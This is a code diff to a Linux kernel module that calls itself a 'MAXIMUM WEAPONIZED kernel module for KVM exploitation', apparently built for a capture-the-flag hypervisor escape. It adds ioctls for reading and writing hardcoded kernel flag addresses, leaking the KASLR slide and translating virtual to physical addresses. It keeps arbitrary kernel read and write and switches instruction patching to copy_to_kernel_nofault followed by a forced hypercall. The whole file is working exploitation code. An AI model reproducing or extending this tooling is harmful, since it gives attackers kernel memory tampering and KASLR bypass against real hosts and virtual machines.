@@ -20,6 +20,7 @@
 #include <linux/kallsyms.h>
 #include <linux/static_call.h>
 #include <linux/set_memory.h>
+#include <linux/pgtable.h>
 
 #define DRIVER_NAME "kvm_probe_drv"
 #define DEVICE_FILE_NAME "kvm_probe_dev"
@@ -92,6 +93,10 @@ struct va_scan_data {
 #define IOCTL_READ_KERNEL_MEM   0x1009
 #define IOCTL_WRITE_KERNEL_MEM  0x100A
 #define IOCTL_PATCH_INSTRUCTIONS 0x100B
+#define IOCTL_READ_FLAG_ADDR   0x100C
+#define IOCTL_WRITE_FLAG_ADDR  0x100D
+#define IOCTL_GET_KASLR_SLIDE  0x100E
+#define IOCTL_VIRT_TO_PHYS     0x100F
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("KVM Probe Lab x Uncle Nickypoo x ChatGPT");
@@ -100,6 +105,10 @@ MODULE_DESCRIPTION("MAXIMUM WEAPONIZED kernel module for KVM exploitation");
 static int major_num;
 static struct class* driver_class = NULL;
 static struct device* driver_device = NULL;
+
+// Flag addresses (update as needed for your kernel)
+static unsigned long g_write_flag_addr = 0xffffffff826279a8;
+static unsigned long g_read_flag_addr = 0xffffffff82b5ee10;
 
 static long force_hypercall(void) {
     long ret;
@@ -110,6 +119,14 @@ static long force_hypercall(void) {
            DRIVER_NAME, end - start, ret);
     return ret;
 }
+
+// Forward declaration and file operations setup
+static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg);
+
+static const struct file_operations fops = {
+    .owner = THIS_MODULE,
+    .unlocked_ioctl = driver_ioctl,
+};
 
 static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
     struct port_io_data p_io_data_kernel;
@@ -272,7 +289,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             ssize_t bytes_read = kernel_read((void *)req.kernel_addr, tmp_buf, req.length, 0);
             if (bytes_read != req.length) {
                 kfree(tmp_buf);
-                printk(KERN_ERR "%s: READ_KERNEL_MEM: kernel_read failed for 0x%lx (expected %lu, got %zd)\n", 
+                printk(KERN_ERR "%s: READ_KERNEL_MEM: kernel_read failed for 0x%lx (expected %lu, got %zd)\n",
                        DRIVER_NAME, req.kernel_addr, req.length, bytes_read);
                 return -EFAULT;
             }
@@ -304,7 +321,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             ssize_t bytes_written = kernel_write((void *)req.kernel_addr, tmp_buf, req.length, 0);
             if (bytes_written != req.length) {
                 kfree(tmp_buf);
-                printk(KERN_ERR "%s: WRITE_KERNEL_MEM: kernel_write failed for 0x%lx (expected %lu, got %zd)\n", 
+                printk(KERN_ERR "%s: WRITE_KERNEL_MEM: kernel_write failed for 0x%lx (expected %lu, got %zd)\n",
                        DRIVER_NAME, req.kernel_addr, req.length, bytes_written);
                 return -EFAULT;
             }
@@ -427,7 +444,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             ssize_t bytes_read = kernel_read((void *)va_req.va, tmp, va_req.size, 0);
             if (bytes_read != va_req.size) {
                 kfree(tmp);
-                printk(KERN_ERR "%s: IOCTL_SCAN_VA: kernel_read failed for VA 0x%lx (expected %lu, got %zd)\n", 
+                printk(KERN_ERR "%s: IOCTL_SCAN_VA: kernel_read failed for VA 0x%lx (expected %lu, got %zd)\n",
                        DRIVER_NAME, va_req.va, va_req.size, bytes_read);
                 return -EFAULT;
             }
@@ -446,16 +463,12 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
         // === PATCH INSTRUCTIONS ===
         case IOCTL_PATCH_INSTRUCTIONS: {
             struct va_scan_data patch_req;
-            long ret = 0;
-
-            printk(KERN_INFO "%s: IOCTL_PATCH_INSTRUCTIONS called\n", DRIVER_NAME);
             if (copy_from_user(&patch_req, (struct va_scan_data __user *)arg, sizeof(patch_req))) {
                 printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: copy_from_user failed\n", DRIVER_NAME);
                 return -EFAULT;
             }
             if (!patch_req.va || !patch_req.size || !patch_req.user_buffer) {
-                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: Null argument: va=0x%lx, size=%lu, user_buffer=%px\n",
-                       DRIVER_NAME, patch_req.va, patch_req.size, patch_req.user_buffer);
+                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: Null argument\n", DRIVER_NAME);
                 return -EINVAL;
             }
             if (patch_req.size > 4096) {
@@ -473,17 +486,109 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: copy_from_user failed\n", DRIVER_NAME);
                 return -EFAULT;
             }
-
-#ifdef HAVE_PROBE_KERNEL_WRITE
-            ret = probe_kernel_write((void *)patch_req.va, tmp, patch_req.size);
-#else
-    printk(KERN_ERR "%s: probe_kernel_write not available on this kernel\n", DRIVER_NAME);
-    kfree(tmp);
-    return -ENOSYS;
-#endif
+            if (copy_to_kernel_nofault((void *)patch_req.va, tmp, patch_req.size)) {
+                kfree(tmp);
+                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: copy_to_kernel_nofault failed\n", DRIVER_NAME);
+                return -EFAULT;
+            }
             kfree(tmp);
             force_hypercall();
             return 0;
+        }
+
+        case IOCTL_READ_FLAG_ADDR: {
+            unsigned long value;
+            if (copy_from_kernel_nofault(&value, (void *)g_read_flag_addr, sizeof(value))) {
+                printk(KERN_ERR "%s: READ_FLAG_ADDR: copy_from_kernel_nofault failed at 0x%lx\n", 
+                       DRIVER_NAME, g_read_flag_addr);
+                return -EFAULT;
+            }
+            if (copy_to_user((unsigned long __user *)arg, &value, sizeof(value))) {
+                return -EFAULT;
+            }
+            printk(KERN_INFO "%s: Read flag value: 0x%lx from 0x%lx\n", 
+                   DRIVER_NAME, value, g_read_flag_addr);
+            force_hypercall();
+            break;
+        }
+
+        case IOCTL_WRITE_FLAG_ADDR: {
+            unsigned long value;
+            if (copy_from_user(&value, (unsigned long __user *)arg, sizeof(value))) {
+                return -EFAULT;
+            }
+            if (copy_to_kernel_nofault((void *)g_write_flag_addr, &value, sizeof(value))) {
+                printk(KERN_ERR "%s: WRITE_FLAG_ADDR: copy_to_kernel_nofault failed at 0x%lx\n", 
+                       DRIVER_NAME, g_write_flag_addr);
+                return -EFAULT;
+            }
+            printk(KERN_INFO "%s: Wrote flag value: 0x%lx to 0x%lx\n", 
+                   DRIVER_NAME, value, g_write_flag_addr);
+            force_hypercall();
+            break;
+        }
+
+        case IOCTL_GET_KASLR_SLIDE: {
+            unsigned long text_start = (unsigned long)_stext;
+            unsigned long slide = text_start - 0xffffffff81000000;
+            if (copy_to_user((unsigned long __user *)arg, &slide, sizeof(slide))) {
+                return -EFAULT;
+            }
+            printk(KERN_INFO "%s: KASLR slide: 0x%lx\n", DRIVER_NAME, slide);
+            break;
+        }
+
+        case IOCTL_VIRT_TO_PHYS: {
+            unsigned long virt = arg;
+            unsigned long phys = 0;
+            pgd_t *pgd;
+            p4d_t *p4d;
+            pud_t *pud;
+            pmd_t *pmd;
+            pte_t *pte;
+
+            if (!virt) {
+                printk(KERN_ERR "%s: VIRT_TO_PHYS: NULL address\n", DRIVER_NAME);
+                return -EINVAL;
+            }
+
+            pgd = pgd_offset(current->mm, virt);
+            if (pgd_none(*pgd) || pgd_bad(*pgd)) {
+                printk(KERN_ERR "%s: VIRT_TO_PHYS: Invalid PGD for 0x%lx\n", DRIVER_NAME, virt);
+                return -EFAULT;
+            }
+
+            p4d = p4d_offset(pgd, virt);
+            if (p4d_none(*p4d) || p4d_bad(*p4d)) {
+                printk(KERN_ERR "%s: VIRT_TO_PHYS: Invalid P4D for 0x%lx\n", DRIVER_NAME, virt);
+                return -EFAULT;
+            }
+
+            pud = pud_offset(p4d, virt);
+            if (pud_none(*pud) || pud_bad(*pud)) {
+                printk(KERN_ERR "%s: VIRT_TO_PHYS: Invalid PUD for 0x%lx\n", DRIVER_NAME, virt);
+                return -EFAULT;
+            }
+
+            pmd = pmd_offset(pud, virt);
+            if (pmd_none(*pmd) || pmd_bad(*pmd)) {
+                printk(KERN_ERR "%s: VIRT_TO_PHYS: Invalid PMD for 0x%lx\n", DRIVER_NAME, virt);
+                return -EFAULT;
+            }
+
+            pte = pte_offset_kernel(pmd, virt);
+            if (!pte || pte_none(*pte)) {
+                printk(KERN_ERR "%s: VIRT_TO_PHYS: Invalid PTE for 0x%lx\n", DRIVER_NAME, virt);
+                return -EFAULT;
+            }
+
+            phys = pte_val(*pte) & PAGE_MASK;
+            phys |= (virt & ~PAGE_MASK);
+
+            if (copy_to_user((unsigned long __user *)arg, &phys, sizeof(phys))) {
+                return -EFAULT;
+            }
+            break;
         }
 
         default:
@@ -493,59 +598,47 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
     return 0;
 }
 
-static struct file_operations fops = {
-    .unlocked_ioctl = driver_ioctl,
-};
-
-static int __init mod_init(void) {
-    printk(KERN_INFO "%s: Initializing Enhanced KVM Probe Module.\n", DRIVER_NAME);
-    major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
+// Module initialization and cleanup
+static int __init driver_init(void) {
+    major_num = register_chrdev(0, DRIVER_NAME, &fops);
     if (major_num < 0) {
-        printk(KERN_ERR "%s: register_chrdev failed: %d\n", DRIVER_NAME, major_num);
+        printk(KERN_ALERT "%s: Failed to register char device\n", DRIVER_NAME);
         return major_num;
     }
+
     driver_class = class_create(THIS_MODULE, DRIVER_NAME);
     if (IS_ERR(driver_class)) {
-        unregister_chrdev(major_num, DEVICE_FILE_NAME);
-        printk(KERN_ERR "%s: class_create failed\n", DRIVER_NAME);
+        unregister_chrdev(major_num, DRIVER_NAME);
+        printk(KERN_ALERT "%s: Failed to create device class\n", DRIVER_NAME);
         return PTR_ERR(driver_class);
     }
-    driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_FILE_NAME);
+
+    driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0),
+                                 NULL, DEVICE_FILE_NAME);
     if (IS_ERR(driver_device)) {
         class_destroy(driver_class);
-        unregister_chrdev(major_num, DEVICE_FILE_NAME);
-        printk(KERN_ERR "%s: device_create failed\n", DRIVER_NAME);
+        unregister_chrdev(major_num, DRIVER_NAME);
+        printk(KERN_ALERT "%s: Failed to create device\n", DRIVER_NAME);
         return PTR_ERR(driver_device);
     }
-    g_vq_virt_addr = NULL;
-    g_vq_phys_addr = 0;
-    g_vq_pfn = 0;
-    printk(KERN_INFO "%s: Module loaded. Device /dev/%s created with major %d.\n", DRIVER_NAME, DEVICE_FILE_NAME, major_num);
+
+    printk(KERN_INFO "%s: Loaded successfully with major number %d\n", 
+           DRIVER_NAME, major_num);
     return 0;
 }
 
-static void __exit mod_exit(void) {
-    printk(KERN_INFO "%s: Unloading KVM Probe Module.\n", DRIVER_NAME);
+static void __exit driver_exit(void) {
+    device_destroy(driver_class, MKDEV(major_num, 0));
+    class_unregister(driver_class);
+    class_destroy(driver_class);
+    unregister_chrdev(major_num, DRIVER_NAME);
+    
     if (g_vq_virt_addr) {
-        printk(KERN_INFO "%s: mod_exit: Freeing VQ page (virt: %p, phys: 0x%llx).\n",
-               DRIVER_NAME, g_vq_virt_addr, (unsigned long long)g_vq_phys_addr);
         free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
-        g_vq_virt_addr = NULL;
-        g_vq_phys_addr = 0;
-        g_vq_pfn = 0;
     }
-    if (driver_device) {
-        device_destroy(driver_class, MKDEV(major_num, 0));
-    }
-    if (driver_class) {
-        class_unregister(driver_class);
-        class_destroy(driver_class);
-    }
-    if (major_num >= 0) {
-        unregister_chrdev(major_num, DEVICE_FILE_NAME);
-    }
-    printk(KERN_INFO "%s: Module unloaded.\n", DRIVER_NAME);
+    
+    printk(KERN_INFO "%s: Unloaded successfully\n", DRIVER_NAME);
 }
 
-module_init(mod_init);
-module_exit(mod_exit);
+module_init(driver_init);
+module_exit(driver_exit);
